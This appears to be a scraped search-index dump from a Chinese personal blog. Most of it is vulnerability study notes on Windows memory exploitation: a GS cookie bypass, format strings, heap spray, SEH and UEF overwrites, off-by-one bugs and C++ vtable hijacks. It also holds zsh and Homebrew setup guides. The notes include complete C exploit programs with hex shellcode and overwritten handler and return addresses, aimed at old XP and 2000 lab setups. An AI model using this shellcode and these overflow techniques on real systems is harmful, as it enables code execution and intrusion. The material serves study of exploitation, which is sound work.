SP4，编译版本为Release版本，编译器为Visual Studio 2005，编译选项为禁用编译优化/0d 使用Windows 2000的原因是为了防止SafeSEH的影响 待完成：Page:277正面硬刚GS(替换.data中的原Cookie)代码#include&amp;lt;string.h&amp;gt;#include&amp;lt;stdlib.h&amp;gt;char Shellcode[] =&quot;\\x90\\x90\\x90\\x90&quot;//new value of cookie in .data &quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xF4\\x6F\\x82\\x90&quot; // result of \\x90\\x90\\x90\\x90 xor EBP &quot;\\x90\\x90\\x90\\x90&quot; // Nop Code&quot;\\x94\\xFE\\x12\\x00&quot; // address of Shellcode ;void test(char * s, int i, char * src){ char dest[200]; if(i &amp;lt; 0x9995) { char* buf = s + i; *buf = *src; *(buf + 1) = *(src + 1); *(buf + 2) = *(src + 2); *(buf + 3) = *(src + 3); strcpy(dest, src); }}void main(){ char* str = (char *)malloc(0x10000); test(str, 0xFFFF2FB8, Shellcode);}说明 注意：测试环境为Windows XP SP3，编译版本为Release版本，编译器为Visual Studio 2008，编译选项为禁用编译优化/0d 当i为负数时，有可能指向.data节 test函数存在典型的栈溢出漏洞 目的：在栈溢出改掉security_cookie(ebp-0x4)的同时，将.data的前四个字节(原始cookie)也改为我们固定的值细节 函数开始时计算security_cookie00401009 |. A1 00304000 mov eax,dword ptr ds:[__security_cookiedt&amp;gt; ; 从0x403000(.data)节前四个字节取得原cookie0040100E |. 33C5 xor eax,ebp ; 用此值和eax异或运算00401010 |. 8945 FC mov [local.1],eax ; 将此值放在ebp-0x4的地方 函数将要返回时验证security_cookie...004010CA |&amp;gt; \\8B4D FC mov ecx,[local.1] ; 将ebp-0x4的值取出放在ecx中004010CD |. 33CD xor ecx,ebp ; 将ebp和ecx异或运算004010CF |. E8 3D000000 call TestCons.__security_check_cookieionF&amp;gt; ; 调用__security_check函数验证cookie...TestCons.__security_check:00401111 &amp;gt; $ 3B0D 00304000 cmp ecx,dword ptr ds:[__security_cookiedt&amp;gt; ; 将ecx和0x403000(.data)的前四个字节比较00401117 . 75 02 jnz short TestCons.0040111B ; 如果不相同则跳转到异常处理流程00401119 . f3:c3 rep retn ; 返回0040111B &amp;gt; E9 AC020000 jmp TestCons.__report_gsfailureokienFilte&amp;gt; ; 异常处理流程函数..." }, { "title": "ZshInstall", "url": "/posts/ZshInstall/", "categories": "Other", "tags": "macOS, Other", "date": "2020-11-10 19:43:00 +0800", "snippet": "关于zsh的安装和配置zsh install and config本文来源：Moeomu的博客安装zsh(install zsh) macOS: brew install zsh Linux Arch Linux: sudo pacman -S zsh Ubuntu: sudo apt install zsh 克隆Git仓库(clone git repo) China mainland: git clone https://gitee.com/mirrors/oh-my-zsh.git Global: git clone https://github.com/ohmyzsh/ohmyzsh.git配置zsh(config)设置为默认shell(set default shell) Set default shell: chsh -s /usr/bin/zsh Rename: mv oh-my-zsh .oh-my-zsh Set user profile: cp .oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc自动补全插件(auto suggestions plugin) git clone git://github.com/zsh-users/zsh-autosuggestions $ZSH_CUSTOM/plugins/zsh-autosuggestions edit ~/.zshrc: plugins=(git)=&amp;gt;plugins=(git zsh-autosuggestions) " }, { "title": "Homebrew和Brewcask的安装", "url": "/posts/Homebrew%E5%92%8CBrewcask%E7%9A%84%E5%AE%89%E8%A3%85/", "categories": "Other", "tags": "macOS, Other, Linux", "date": "2020-11-10 19:43:00 +0800", "snippet": "HomeBrew的安装，真是历经了多次失败，在此总结一下成功之谈大家请注意时效性：本文写于2020/11/10&amp;amp;&amp;amp;本文更新于2021/07/02本文来源：Moeomu的博客安装git 方法一：安装XCode Terminal:xcode-select --install 方法二：直接去git网站下载git的macOS安装包安装HomeBrew 首先下载原版installer.sh的jsDelivr CDN镜像 输入下列指令运行： git config --global url.&quot;https://mirrors.ustc.edu.cn/homebrew-core.git&quot;.insteadOf &quot;https://github.com/Homebrew/homebrew-core&quot;git config --global url.&quot;https://mirrors.ustc.edu.cn/linuxbrew-core.git&quot;.insteadOf &quot;https://github.com/Homebrew/linuxbrew-core&quot;git config --global url.&quot;https://mirrors.ustc.edu.cn/brew.git&quot;.insteadOf &quot;https://github.com/Homebrew/brew&quot;chmod +x install.shHOMEBREW_BOTTLE_DOMAIN=https://mirrors.ustc.edu.cn/homebrew-bottles ./install.sh 通过USTC的git源克隆Homebrew-Cask项目 cd /usr/local/Homebrew/Library/Taps/homebrew git clone https://mirrors.ustc.edu.cn/homebrew-cask.git 检查源配置 查看brew镜像源：git -C &quot;$(brew --repo)&quot; remote -v 查看homebrew-core镜像源：git -C &quot;$(brew --repo homebrew/core)&quot; remote -v 查看homebrew-cask镜像源：git -C &quot;$(brew --repo homebrew/cask)&quot; remote -v 合格的标准是这些源的地址全是USTC的网址Update brew update安装Oh-My-Zsh(非必须) 更新zsh：brew install zsh git克隆oh-my-zsh项目：git clone https://gitee.com/mirrors/oh-my-zsh.git 重命名项目：mv oh-my-zsh .oh-my-zsh 将模版复制到home目录下命名为.zshrc：cp .oh-my-zsh/templates/zshrc.zsh-template ~/.zshrc 退出Terminal，启动Terminal，成功配置Terminal(非必须) 偏好设置-启动时，打开-使用描述文件新建窗口-Homebrew 偏好设置-描述文件-Homebrew-文本-字体-14点配置Terminal代理(非必须)export https_proxy=http://127.0.0.1:7809export http_proxy=http://127.0.0.1:7809" }, { "title": "漏洞学习笔记-011-其它类型的漏洞和Windows安全机制", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-011-%E5%85%B6%E5%AE%83%E7%B1%BB%E5%9E%8B%E7%9A%84%E6%BC%8F%E6%B4%9E%E5%92%8CWindows%E5%AE%89%E5%85%A8%E6%9C%BA%E5%88%B6/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-25 18:50:00 +0800", "snippet": "其它类型的漏洞和Windows安全机制概述本文来源：Moeomu的博客格式化串漏洞printf中的缺陷 例子#include &quot;stdio.h&quot;void main(){ int a = 44,b = 77; printf(&quot;a=%d, b=%d\\n&quot;,a,b); printf(&quot;a=%d, b=%d\\n&quot;);} 上述代码中第二个调用缺少了输出数据的变量列表 然而第二次调用没有引起编译错误，程序正常执行用printf读取内存数据 例子#include &quot;stdio.h&quot;int main(int argc, char ** argv){ printf(argv[1]);} 当我们向程序传入普通字符串，得到普通字符串 但是如果带有格式控制符，可以读出栈中的数据用printf向内存中写数据 例子#include &quot;stdio.h&quot;int main(int argc, char ** argv){ int len_print = 0; printf(&quot;before write: length=%d\\n&quot;, len_print); printf(&quot;Misaka:%d%n\\n&quot;,len_print, &amp;amp;len_print); printf(&quot;after write: length=%d\\n&quot;, len_print);} %n控制符计算出了输出的字符串的长度，然后将它写回了len_print变量中SQL注入攻击原理 它源于PHP，ASP等脚本语言堆用户输入数据和解析时的缺陷它不是二进制漏洞，在此不再讨论Windows安全机制图灵机的缺陷 代码和数据没有明确区分，所以总存在一些问题 例如堆栈溢出攻击，加壳脱壳技术，变形病毒技术 跨站脚本攻击，SQL注入攻击同样都是利用此缺陷造成的Windows的变革宏观变革 增加了Windows安全中心 为Windows添加了防火墙 未经允许，Web弹窗和ActiveX控件安装将禁止 IE7添加了筛选仿冒网站功能 添加了UAC(User Account Control)用户账户控制机制，防止恶意软件在未经许可的情况下在计算机上进行安装或者堆计算机进行更改 集成了Windows Defender，可以阻止，控制，删除间谍软件和恶意软件内存安全的变革 使用GS编译技术，在函数返回地址前加入了SecurityCookie，在函数返回前首先检测SecurityCookie是否覆盖，栈溢出变得困难 增加了堆SEH的安全校验机制，有效防止大多数改写SEH而劫持进程的攻击 堆中加入了Heap Cookie，Safe Unlinking等安全机制，堆溢出的限制更多 DEP(Data Execution Protection)数据执行保护将数据部分标识为不可执行，阻止栈，堆和数据节中攻击代码的执行 ASLR(Address Space Layout Randomization)加载地址随机化技术通过堆系统关键地址的随机化，使得经典的堆栈溢出手段失效 SEHOP(Structured Exception Handler Overwrite Protection)SEH覆盖保护作为堆SEH安全机制的补充，将SEH的保护提升到系统级别，使得SEH的保护机制更有效Windows安全机制汇总   Windows XP Windows 2003 Windows Vista Windows 2008 Windows 7 GS           安全Cookies √ √ √ √ √ 变量重排 √ √ √ √ √ 安全SEH           SEH句柄验证 √ √ √ √ √ 堆保护           安全拆卸 √ √ √ √ √ 安全快表 × × √ √ √ Heap Cookie √ √ √ √ √ 元数据加密 × × √ √ √ DEP           NX 支持 √ √ √ √ √ 永久DEP × × √ √ √ 默认OptOut × √ × √ × ASLR           PEB, TEB √ √ √ √ √ 堆 × × √ √ √ 栈 × × √ √ √ 映像 × × √ √ √ SEHOP           SEH链验证 × × √ √ √ " }, { "title": "漏洞学习笔记-010-HeapSpray", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-010-HeapSpray/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-25 17:56:00 +0800", "snippet": "Heap Spray - 堆与栈的协同攻击声明：实验环境为 Windows 2000本文来源：Moeomu的博客简介 针对浏览器的攻击中，常常会结合使用堆和栈协同利用漏洞 当浏览器或其使用的ActiceX控件中存在溢出漏洞时，攻击者就可以生成一个特殊的HTML文件来触发这个漏洞 不管是堆溢出还是栈溢出，漏洞触发后最终能够获得EIP 有时我们可能很难在浏览器中复杂的内存环境下不知完整的shellcode 页面中的JavaScript可以申请堆内存，因此shellcode通过JavaScript布置在堆中称为可能 shellcode放在堆中如何定位：HeapSpray技术细节 在使用Heap Spray的时候，一般将EIP指向堆区0x0C0C0C0C位置，然后用JavaScript申请使用大量堆内存并用包含着0x90和shellcode的内存片覆盖这些内存 通常，JS会从低地址向高地址分配内存，因此申请的内存超过200MB的话，0x0C0C0C0C将被含有shellcode的内存片覆盖，只要内存片中的0x90能够命中0x0C0C0C0C，shellcode就可以执行JS代码var nop = unescape(&quot;%u9090%u9090&quot;);while(nop.length &amp;lt;= 0x100000/2){ nop+=nop;}//生成一个 1MB 大小充满 0x90 的数据块nop = nop.substring(0, 0x100000/2 - 32/2 - 4/2 - shellcode.length - 2/2);var slide = new Arrary();for (var i = 0; i &amp;lt; 200; i++){ slide[i] = nop + shellcode} 解释 每个内存片大小为1MB 首先产生一个大小为1MB而且全部被0x90填满的内存块 由于Java会为申请到的内存填上一些额外的信息，为了保证内存片是1MB，要将这些空间减去 我们使用200个这样的内存片来覆盖堆内存，只要任意一篇nop区可以覆盖0x0C0C0C0C，就可以成功 额外空间   size 说明 malloc header 32 byte 堆块信息 string length 4 byte 表示字符串长度 terminator 2 1 byte 堆块信息 实践 未完待续" }, { "title": "漏洞学习笔记-009-Windows异常的深入", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-009-Windows%E5%BC%82%E5%B8%B8%E7%9A%84%E6%B7%B1%E5%85%A5/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-25 15:09:00 +0800", "snippet": "深入挖掘Windows异常处理，附带一些其它的利用方法声明：实验环境为 Windows XP SP3本文来源：Moeomu的博客不同级别的SEH 异常处理的最小作用域是线程，每个线程都拥有自己的SEH链表，发生错误时，首先使用自己的SEH进行处理 一个进程中可能同时存在很多个线程，进程中也由一个能处理全局的异常处理。当线程自身的SEH无法修复错误时，进程的SEH将处理异常。这种异常处理可能会影响到进程下属的所有线程 操作系统为所有程序提供了一个默认的异常处理函数，当所有的异常处理函数都无法处理错误时，这个默认的异常处理函数将被最终调用，结果一般时显示要给错误对话框 以下是简单的异常处理流程 首先执行线程中距离汉鼎最近的SEH或异常处理函数 若失败，则依次尝试执行SEH链表中后续的异常处理函数 若SEH链中所有的异常处理函数都没能处理异常，则执行进程的异常处理 若仍然失败，系统默认的异常处理函数将被调用，程序崩溃的对话框将弹出 线程的异常处理 线程通过TEB引用SEH链表依次尝试处理异常的过程 用于异常处理的回调函数有4个参数 pExecpt：指向一个重要的结构体：EXCEPTION_RECORD，此结构包含了若干个与异常相关的信息，如异常的类型，异常发生的地址等 pFrame：指向栈帧中的SEH结构体 pContext：指向Context结构体，此结构体包含了所有寄存器的状态 pDispatch：未知 回调函数执行前，系统将上述异常发生时的断点信息压栈。更绝这些描述，回调函数可以轻松处理异常 回调函数返回后，操作系统会更具返回的结果决定下一步做什么。异常处理函数可能返回两种结果 0(Exception Continue Excetutuon)：代表异常成功处理，将返回程序发生异常的地方，继续执行后续指令 1(Exception Continue Search)：异常处理失败，将顺着SEH链表搜索其它可以用于异常处理的函数并尝试处理 UNWIND操作 异常发生时，操作系统将顺着SEH链表搜索处理异常的句柄，一旦找到，系统将已经遍历过的SEH异常处理函数再调用一遍 主要目的是通知前边处理异常失败的SEH，系统将它们遗弃了，请它们清理现场释放资源，之后将SEH结构体从链表中拆除 当pExcept指向的EXCEPTION_RECORD结构体中ExceptionCode被设置为0xC0000027(STATUS_UNWIND)，ExceptionFlags被设置为0x2(EH_UNWINDING)时，对回调函数的调用就属于unwind调用 此操作通过kernel.32中的一个导出函数RtlUnwind实现 在使用回调函数之前，系统将判断当前是否处于调试状态，如果是调试状态，将把异常交给调试器处理 EXCEPTION_RECORDtypedef struct _EXCEPTION_RECORD { DWORD ExceptionCode; DWORD ExceptionFlags; //异常标志位 struct _EXCEPTION_RECORD *ExceptionRecord; PVOID ExceptionAddress; DWORD NumberParameters; DWORD ExceptionInformation [EXCEPTION_MAXIMUM_PARAMETERS]; } EXCEPTION_RECORD; RtlUnwindvoid RtlUnwind( PVOID TargetFrame, PVOID TargetIp, PEXCEPTION_RECORD ExceptionRecord, PVOID ReturnValue);进程异常处理 所有线程中发生的异常如果没有被线程或异常处理函数后者调试器处理掉，最终将交给进程中异常处理函数处理 进程异常处理的回调函数需要通过API函数SetUnhandleExceptionFilter来注册 此函数返回值有3种 1(EXCEPTION_EXECUTE_HANDLER)：表示错误得到正确的处理，程序将退出。 0(EXCEPTION_CONTINUE_SEARCH)：无法处理错误，将错误转交给系统默认的异常处理。 -1(EXCEPTION_CONTINUE_EXECUTION)：表示错误得到正确的处理，并将继续执行下去。类似于线程的异常处理，系统会用回调函数的参数恢复出异常发生时的断点状况，但这时引起异常的寄存器值应该已经得到了修复。 SetUnhandleExceptionFilterLPTOP_LEVEL_EXCEPTION_FILTER SetUnhandledExceptionFilter( LPTOP_LEVEL_EXCEPTION_FILTER lpTopLevelExceptionFilter);系统默认的异常处理UEF 如果进程异常处理失败或者程序没有进程异常处理，系统默认的异常处理函数UnhandledExceptionFilter()将被调用，这个函数是一个终极异常处理函数UEF(Unhandled Exception Filter) MSDN中将它称为“top-level exception handler”，即顶层异常处理，或是最后使用的异常处理 在Windows 2000- Windows XP，此函数将检查注册表HKLM\\SOFTWARE\\Microsoft\\WindowsNT\\CurrentVersion\\AeDebug中的内容，Auto项标识是否弹出对话框，1表示不弹出直接结束程序，其它均会弹出 Debugger项目指明了系统默认调试器异常流程总结 CPU执行捕获异常，内核接过控制权开始内核态异常处理 内核异常处理结束，将控制权交给用户态 用户态第一个处理异常的函数时ntdll.dll中的KiUserExceptionDispatcher()函数 此函数首先检查程序是否调试态，若被调试，将异常交给调试器处理 尝试加入VEH(Vectored Exception Handling)去处理异常 非调试态，调用RtlDispatchException()函数对线程的SEH链表进行遍历，若能找到处理异常的回调函数，将再次遍历先前调用过的SEH句柄，即unwind操作，保证异常处理机制的完整性 若栈中所有的SEH都失败了，进程拥有异常处理函数，将调用此函数 若自定义的进程异常处理失败，系统默认的UEF将被调用其它异常处理利用思路VEH的利用 WindowsXP开始，增加了一种新的异常处理：VEH(Vectored Exception Handler)向量化异常处理 VEH和进程异常处理类似，都是基于进程，需要使用API注册回调函数 可以胡策多个VEH，结构体之间串成双向链表 处理优先级次于调试器处理，高于SEH处理 注册VEH可以执行它在链中的位置 VEH保存在堆中 unwind操作不会涉及VEH进程类的异常处理 VEH结构struct _VECTORED_EXCEPTION_NODE { DWORD m_pNextNode; DWORD m_pPreviousNode; PVOID m_pfnVectoredHandler;} VEH注册函数PVOID AddVectoredExceptionHandler( ULONG FirstHandler, PVECTORED_EXCEPTION_HANDLER VectoredHandler); 如果利用堆溢出的DWORD SHOOT修改指向VEH头节点的指针，在异常处理开始后，能引导程序执行shellcode攻击TEB中的SEH头节点 线程的SEH链通过TEB第一个DWORD指针指向离栈顶最近的SEH，若修改TEB中这个指针，将在异常发生的时候将程序引导到shellcode中去只执行 局限性 一个进程存在多个线程 每个线程都有一个TEB 第一个TEB开始于0x7FFDE000 新线程的TEB将紧随前边的TEB，之间相隔0x1000字节，向内存低地址方向增长 多线程程序很难判断当前线程是哪个，以及对应的TEB在什么位置，攻击TEB中SEH头节点的方法一般用于单线程程序 尽管可以创建很多线程或者关闭大量线程去试图控制TEB排列，但是多线程状态下不应该执着地利用TEB了攻击UEF 堆溢出时DOWRD SHOOT的target指向UEF的入口，data为shellcode的入口地址，再制造一个只能由UEF来处理的异常 结合使用跳板技术能够使exploit成功率更高 异常发生时，EDI往往指向堆中离shellcode不远的地方 将UEF的句柄覆盖成一条CALL DWORD PTR [EDI + 0x78]的指令地址就往往可以让程序跳入shellcode 或者CALL DWORD PTR [ESI + 0x4C]或者CALL DWORD PTR [EBP + 0x74]均可攻击PEB中函数指针 ExitProcess()再清理现场的时候需要进入临界区以同步线程，最终将调用RtlEnterCriticalSection()和RtlLeaceCriticalSection() PEB的地址永远不变，比起TEB来说是更好的选择off by one的利用 漏洞利用技术的层次： 基础的栈溢出利用：利用返回地址劫持进程 高级的栈溢出利用：只能淹没部分EBP无法抵达返回地址的利用，如对strncpy函数误用时产生的off by one的利用 堆溢出以及格式化串漏洞的利用 利用 代码片段void off_by_one(char * input){ char buf[200]; int i = 0, len = 0; len = sizeof(buf); for(i = 0; input[i]&amp;amp;&amp;amp;(i &amp;lt;= len); i++) { buf[i] = input[i]; }} 此函数试图防止在字符串复制时发生数组越界，但循环中i &amp;lt;= len在边界控制中出错了，可能会溢出一个字节 我们可以在255个字节的范围内控制EBP，也可能控制程序某些重要参数攻击C++虚函数理论 C++类的成员函数在声明的时候，若使用了virtual关键字修饰，则是虚函数 一个类中可能由很多个虚函数 虚函数的入口地址被统一保存在虚表(Vtable)中 对象在使用虚函数的时候，先通过虚表指针找到虚表，然后从虚表中取出最终的函数入口地址进行调用 虚表指针保存在对象的内存空间，紧接着虚表指针的是其它成员变量 虚函数只有通过对象指针的引用才能显示出动态调用的特性尝试 对象中的成员变量溢出后，有机会修改对象中的虚表指针或者修改虚表中的虚函数指针 这样就有可能会执行shellcode 代码尝试/*Test on Windows XP SP3 without any other patch.*/#include &quot;windows.h&quot;#include &quot;iostream.h&quot;char shellcode[]=&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\xA9\\x33\\xDB&quot;&quot;\\x53\\x68\\x6B\\x61\\x6F\\x6F\\x68\\x4D\\x69\\x73\\x61\\x8B\\xC4\\x53\\x50\\x50&quot;&quot;\\x53\\xFF\\x57\\xFC\\x53\\xFF\\x57\\xF8\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xAC\\xBA\\x40\\x00&quot;; // set fake virtual function pointerclass Failwest{ public: char buf[200]; virtual void test(void) { cout &amp;lt;&amp;lt; &quot;Class Vtable::test()&quot; &amp;lt;&amp;lt; endl; }};Failwest overflow, *p;void main(void){ char * p_vtable; p_vtable = overflow.buf - 4; // point to virtual table cout &amp;lt;&amp;lt; &quot;Buf Address:&quot; &amp;lt;&amp;lt; &amp;amp;overflow.buf &amp;lt;&amp;lt; endl; // reset fake virtual table to 0x0040BB5C // the address may need to ajusted via runtime debug p_vtable[0] = 0x5C; p_vtable[1] = 0xBB; p_vtable[2] = 0x40; p_vtable[3] = 0x00; strcpy(overflow.buf,shellcode); // set fake virtual function pointer p = &amp;amp;overflow; p-&amp;gt;test();}说明 虚表指针位于成员变量char buf[200]之前，程序中通过p_vtable = overflow.buf - 4定位到此指针 修改虚表指向缓冲区0x0040BB5C处，这里是shellcode的末尾，在这里填入0x0040BAAC也就是shellcode的起始地址，程序将跳去执行shellcode 这种方式既不是栈溢出也不是堆溢出，因为对象的内存空间位于堆中，但是却是连续线性覆盖的空间，所以准确的说应该叫做“数组溢出”或者“连续性覆盖” 使用DWORD SHOOT攻击虚表可能会更加简单" }, { "title": "漏洞学习笔记-008-Windows异常的利用", "url": "/posts/%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0-008-Windows%E5%BC%82%E5%B8%B8%E7%9A%84%E5%88%A9%E7%94%A8/", "categories": "Exploit", "tags": "Windows, Exploit", "date": "2020-10-25 11:32:00 +0800", "snippet": "SEH的栈利用和堆利用声明：实验环境为 Windows 2000本文来源：Moeomu的博客SEH概述 SEH是异常处理结构体(Structure Exception Handler)，是Windows异常处理机制采用的重要的数据结构。每个SEH包含两个DWORD指针：SEH链表指针和异常处理函数句柄，共8个字节 SEH结构存放在栈中 线程初始化时，自动向栈中安装一个SEH作为线程默认的异常处理 如果程序源代码中使用了try-except等异常处理机制，编译器最终通过向当前函数栈帧中安装一个SEH来实现异常处理 栈中一般会同时存在多个SEH 栈中的多个SEH通过链表指针在栈内由栈顶向栈底串成单项链表，位于链表最顶端的SEH通过TEB0字节偏移处的指针标识 异常发生时，操作系统会终端程序，首先从TEB的0偏移处去除距离栈顶最近的SEH使用异常处理函数句柄指向的代码来处理异常 当离事故现场最近的异常处理函数运行失败时，将顺着SEH链表依次尝试其它的异常处理函数 如果程序安装的所有异常处理函数都不能处理，系统将采用默认的异常处理函数，此函数将弹出错误对话框然后强制关闭程序SEH利用思路 SEH存放在栈内，溢出缓冲区的数据可以淹没SEH 将SEH入口改为shellcode起始地址 溢出后错误的栈帧或堆块数据会触发异常 Windows开始处理异常后，将shellcode当作异常处理函数而执行SEH的栈利用测试NOP测试代码#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[] =&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90&quot; // next SEH Record&quot;\\x90\\x90\\x90\\x90&quot; // SE Handler Function Address&quot;\\x90\\x90\\x90\\x90&quot; // Nothing&quot;\\x90\\x90\\x90\\x90&quot; // Nothing&quot;\\x90\\x90\\x90\\x90&quot; // EBP&quot;\\x90\\x90\\x90\\x90&quot; // Return Address;DWORD MyExceptionhandler(void){ printf(&quot;got an exception, press Enter to kill process!\\n&quot;); getchar(); ExitProcess(1); return 0;}void test(char* input){ char buf[200]; int zero = 0; __asm int 3 // used to break process for debug __try { strcpy(buf, input); // overrun the stack zero = 4 / zero; // generate an exception } __except(MyExceptionhandler()){}}void main(){ test(shellcode);}观察 0x0012FE98地址处时shellcode的起始位置 当前线程一共安装了3个SEH，离栈顶最近的位于0x0012FF68，这是最先调用的SEH 我们要覆盖的地址是0x0012FF6C，这是处理函数的地址，内容填入ShellCode的起始地址即可实际测试代码#include &amp;lt;stdio.h&amp;gt;#include &amp;lt;windows.h&amp;gt;char shellcode[]=&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90\\x90&quot;&quot;\\xFC\\x68\\x6A\\x0A\\x38\\x1E\\x68\\x63\\x89\\xD1\\x4F\\x68\\x32\\x74\\x91\\x0C&quot;&quot;\\x8B\\xF4\\x8D\\x7E\\xF4\\x33\\xDB\\xB7\\x04\\x2B\\xE3\\x66\\xBB\\x33\\x32\\x53&quot;&quot;\\x68\\x75\\x73\\x65\\x72\\x54\\x33\\xD2\\x64\\x8B\\x5A\\x30\\x8B\\x4B\\x0C\\x8B&quot;&quot;\\x49\\x1C\\x8B\\x09\\x8B\\x69\\x08\\xAD\\x3D\\x6A\\x0A\\x38\\x1E\\x75\\x05\\x95&quot;&quot;\\xFF\\x57\\xF8\\x95\\x60\\x8B\\x45\\x3C\\x8B\\x4C\\x05\\x78\\x03\\xCD\\x8B\\x59&quot;&quot;\\x20\\x03\\xDD\\x33\\xFF\\x47\\x8B\\x34\\xBB\\x03\\xF5\\x99\\x0F\\xBE\\x06\\x3A&quot;&quot;\\xC4\\x74\\x08\\xC1\\xCA\\x07\\x03\\xD0\\x46\\xEB\\xF1\\x3B\\x54\\x24\\x1C\\x75&quot;&quot;\\xE4\\x8B\\x59\\x24\\x03\\xDD\\x66\\x8B\\x3C\\x7B\\x8B\\x59\\x1C\\x03\\xDD\\x03&quot;&quot;\\x2C\\xBB\\x95\\x5F\\xAB\\x57\\x61\\x